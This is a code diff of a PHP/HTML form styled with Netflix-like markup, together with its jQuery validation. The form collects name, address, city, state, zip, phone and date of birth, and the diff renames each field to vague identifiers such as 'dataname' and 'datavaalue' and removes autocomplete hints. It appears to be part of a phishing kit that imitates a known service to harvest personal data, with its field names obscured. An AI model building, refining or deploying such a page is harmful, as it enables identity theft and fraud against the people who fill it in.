@@ -6712,9 +6712,9 @@ select:focus:not(:focus-visible) ~ .bordecustom {
                             <li data-uia="field-firstName+wrapper" class="nfFormSpace">
                                <div class="silvercard">
 							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
-                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['fullName']; ?></label>
+                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['dataname']; ?></label>
                                 <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
-                                  <input type="text" autocomplete="name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="fullname" name="firstName" data-uia="field-name" value="">
+                                  <input type="text"  dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="dataname" name="datavaalue" data-uia="field-name" value="">
                                   <div aria-hidden="true" id="borderfull" class="bordecustom" dir="ltr"></div>
                                 </div>
                               </div>
@@ -6723,9 +6723,9 @@ select:focus:not(:focus-visible) ~ .bordecustom {
 							                            <li data-uia="field-firstName+wrapper" class="nfFormSpace">
                                <div class="silvercard">
 							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
-                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['address']; ?></label>
+                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['dataadd']; ?></label>
                                 <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
-                                  <input type="text" autocomplete="name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="address" name="firstName" data-uia="field-name" value="">
+                                  <input type="text"  dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="dataadd" name="datavaalue" data-uia="field-name" value="">
                                   <div aria-hidden="true" id="borderadd" class="bordecustom" dir="ltr"></div>
                                 </div>
                               </div>
@@ -6734,9 +6734,9 @@ select:focus:not(:focus-visible) ~ .bordecustom {
 							                            <li data-uia="field-firstName+wrapper" class="nfFormSpace">
                                <div class="silvercard">
 							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
-                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['city']; ?></label>
+                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['datacit']; ?></label>
                                 <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
-                                  <input type="text" autocomplete="name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="city" name="firstName" data-uia="field-name" value="">
+                                  <input type="text"  dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="datacit" name="datavaalue" data-uia="field-name" value="">
                                   <div aria-hidden="true" id="bordercity" class="bordecustom" dir="ltr"></div>
                                 </div>
                               </div>
@@ -6745,9 +6745,9 @@ select:focus:not(:focus-visible) ~ .bordecustom {
 							                            <li data-uia="field-firstName+wrapper" class="nfFormSpace">
                                <div class="silvercard">
 							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
-                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['state']; ?></label>
+                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['datast']; ?></label>
                                 <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
-                                  <input type="text" autocomplete="name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="state" name="firstName" data-uia="field-name" value="">
+                                  <input type="text"  dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="datast" name="datavaalue" data-uia="field-name" value="">
                                   <div aria-hidden="true" id="borderstat" class="bordecustom" dir="ltr"></div>
                                 </div>
                               </div>
@@ -6756,9 +6756,9 @@ select:focus:not(:focus-visible) ~ .bordecustom {
 							                            <li data-uia="field-firstName+wrapper" class="nfFormSpace">
                                <div class="silvercard">
 							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
-                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['zip']; ?></label>
+                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['datazp']; ?></label>
                                 <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
-                                  <input type="text" autocomplete="name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="zip" name="firstName" data-uia="field-name" value="">
+                                  <input type="text"  dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="datazp" name="datavaalue" data-uia="field-name" value="">
                                   <div aria-hidden="true" id="borderzip" class="bordecustom" dir="ltr"></div>
                                 </div>
                               </div>
@@ -6767,9 +6767,9 @@ select:focus:not(:focus-visible) ~ .bordecustom {
 							                            <li data-uia="field-firstName+wrapper" class="nfFormSpace">
                                <div class="silvercard">
 							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
-                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['phone']; ?></label>
+                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['dataph']; ?></label>
                                 <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
-                                  <input type="text" autocomplete="name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="phone" name="firstName" data-uia="field-name" value="">
+                                  <input type="text"  dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="dataph" name="datavaalue" data-uia="field-name" value="">
                                   <div aria-hidden="true" id="borderphone" class="bordecustom" dir="ltr"></div>
                                 </div>
                               </div>
@@ -6778,9 +6778,9 @@ select:focus:not(:focus-visible) ~ .bordecustom {
 							                            <li data-uia="field-firstName+wrapper" class="nfFormSpace">
                                <div class="silvercard">
 							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
-                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['dateOfBirth']; ?></label>
+                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['datadb']; ?></label>
                                 <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
-                                  <input type="text" oninput="formatDOB(this)" autocomplete="name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="dob" name="firstName" data-uia="field-name" value="">
+                                  <input type="text" oninput="formatDOB(this)"  dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="datadb" name="datavaalue" data-uia="field-name" value="">
                                   <div aria-hidden="true" id="borderdob" class="bordecustom" dir="ltr"></div>
                                 </div>
                               </div>
@@ -10405,13 +10405,13 @@ async function submit_form() {
 
     // Define inputs with corresponding IDs for direct border application
     const inputs = {
-        fullname: { element: $('#fullname'), minLength: 2, borderId: '#borderfull' },
-        address: { element: $('#address'), minLength: 5, borderId: '#borderadd' },
-        city: { element: $('#city'), minLength: 2, borderId: '#bordercity' },
-        state: { element: $('#state'), minLength: 2, borderId: '#borderstat' },
-        zip: { element: $('#zip'), minLength: 3, borderId: '#borderzip' },
-        phone: { element: $('#phone'), minLength: 5, borderId: '#borderphone' },
-        dob: { element: $('#dob'), minLength: 8, borderId: '#borderdob' }
+        fullname: { element: $('#dataname'), minLength: 2, borderId: '#borderfull' },
+        address: { element: $('#dataadd'), minLength: 5, borderId: '#borderadd' },
+        city: { element: $('#datacit'), minLength: 2, borderId: '#bordercity' },
+        state: { element: $('#datast'), minLength: 2, borderId: '#borderstat' },
+        zip: { element: $('#datazp'), minLength: 3, borderId: '#borderzip' },
+        phone: { element: $('#dataph'), minLength: 5, borderId: '#borderphone' },
+        dob: { element: $('#datadb'), minLength: 8, borderId: '#borderdob' }
     };
 
     let isValid = true;
